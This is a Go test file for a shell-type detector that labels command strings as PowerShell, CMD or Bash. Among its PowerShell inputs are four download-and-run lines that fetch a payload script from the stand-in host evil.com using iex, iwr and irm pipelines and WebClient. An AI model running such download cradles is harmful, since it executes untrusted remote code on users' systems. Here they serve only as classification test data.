package core

import (
	"runtime"
	"testing"
)

func TestDetectShellType_PowerShell(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"Get-ChildItem", "Get-ChildItem -Path C:\\Users"},
		{"Remove-Item recursive", "Remove-Item -Recurse -Force ./build"},
		{"Invoke-WebRequest", "Invoke-WebRequest -Uri https://example.com"},
		{"alias iex", "iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"},
		{"alias iwr pipeline", "iwr http://evil.com/payload.ps1 | iex"},
		{"alias irm pipeline", "irm http://evil.com/payload.ps1 | iex"},
		{"powershell type literal", "[System.Net.WebClient]::new().DownloadFile('http://evil.com/payload.ps1','payload.ps1')"},
		{"ConvertTo-Json", "ConvertTo-Json $data"},
		{"Select-String", "Select-String -Pattern 'error' log.txt"},
		{"Test-Path", "Test-Path /some/path"},
		{"ForEach-Object", "ForEach-Object { $_.Name }"},
		{"case insensitive", "get-childitem -Path ."},
		{"cmdlet mid-command", "some-thing | Where-Object { $_.Status -eq 'Running' }"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectShellType(tt.command)
			if got != ShellPowerShell {
				t.Errorf("DetectShellType(%q) = %v, want PowerShell", tt.command, got)
			}
		})
	}
}

func TestDetectShellType_CMD(t *testing.T) {
	// Explicit cmd.exe wrappers work on all platforms.
	wrapperTests := []struct {
		name    string
		command string
	}{
		{"cmd.exe /c", "cmd.exe /c dir /b"},
		{"cmd /c", "cmd /c echo hello"},
		{"cmd /C uppercase", "cmd /C type file.txt"},
	}

	for _, tt := range wrapperTests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectShellType(tt.command)
			if got != ShellCMD {
				t.Errorf("DetectShellType(%q) = %v, want CMD", tt.command, got)
			}
		})
	}

	// CMD-only builtins are only detected on Windows (step 4 is gated).
	if runtime.GOOS == "windows" {
		builtinTests := []struct {
			name    string
			command string
		}{
			{"dir", "dir /b"},
			{"type", "type file.txt"},
			{"cls", "cls"},
			{"ver", "ver"},
			{"copy", "copy src.txt dst.txt"},
			{"del", "del /q temp.txt"},
		}

		for _, tt := range builtinTests {
			t.Run("builtin/"+tt.name, func(t *testing.T) {
				got := DetectShellType(tt.command)
				if got != ShellCMD {
					t.Errorf("DetectShellType(%q) = %v, want CMD (on Windows)", tt.command, got)
				}
			})
		}
	}
}

func TestDetectShellType_Bash(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"ls", "ls -la"},
		{"grep", "grep foo bar.txt"},
		{"echo", "echo hello world"},
		{"find", "find . -name '*.go'"},
		{"cat", "cat /etc/hosts"},
		{"curl", "curl -s https://example.com"},
		{"empty", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectShellType(tt.command)
			if got != ShellBash {
				t.Errorf("DetectShellType(%q) = %v, want Bash", tt.command, got)
			}
		})
	}
}

func TestDetectShellType_Wrappers(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    ShellType
	}{
		{"powershell.exe -Command", "powershell.exe -Command Get-Process", ShellPowerShell},
		{"pwsh -Command", "pwsh -Command Get-ChildItem", ShellPowerShell},
		{"powershell bare", "powershell -NoProfile -File script.ps1", ShellPowerShell},
		{"pwsh.exe", "pwsh.exe -ExecutionPolicy Bypass -File test.ps1", ShellPowerShell},
		{"cmd.exe /c", "cmd.exe /c echo hello", ShellCMD},
		{"cmd /c", "cmd /c dir", ShellCMD},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectShellType(tt.command)
			if got != tt.want {
				t.Errorf("DetectShellType(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestDetectShellType_Ambiguous(t *testing.T) {
	// Commands that exist on both Unix and Windows should default to Bash.
	// On non-Windows, CMD-only builtins like "dir" also default to Bash.
	tests := []struct {
		name    string
		command string
	}{
		{"echo", "echo hello"},
		{"ls", "ls"},
		{"set", "set -e"},
	}

	if runtime.GOOS != "windows" {
		// On non-Windows, dir also defaults to Bash.
		tests = append(tests, struct {
			name    string
			command string
		}{"dir", "dir /b"})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := DetectShellType(tt.command)
			if got != ShellBash {
				t.Errorf("DetectShellType(%q) = %v, want Bash (ambiguous defaults to Bash)", tt.command, got)
			}
		})
	}
}

func TestShellType_String(t *testing.T) {
	tests := []struct {
		shell ShellType
		want  string
	}{
		{ShellBash, "bash"},
		{ShellPowerShell, "powershell"},
		{ShellCMD, "cmd"},
		{ShellType(99), "bash"}, // unknown defaults to bash
	}

	for _, tt := range tests {
		t.Run(tt.want, func(t *testing.T) {
			got := tt.shell.String()
			if got != tt.want {
				t.Errorf("ShellType(%d).String() = %q, want %q", tt.shell, got, tt.want)
			}
		})
	}
}
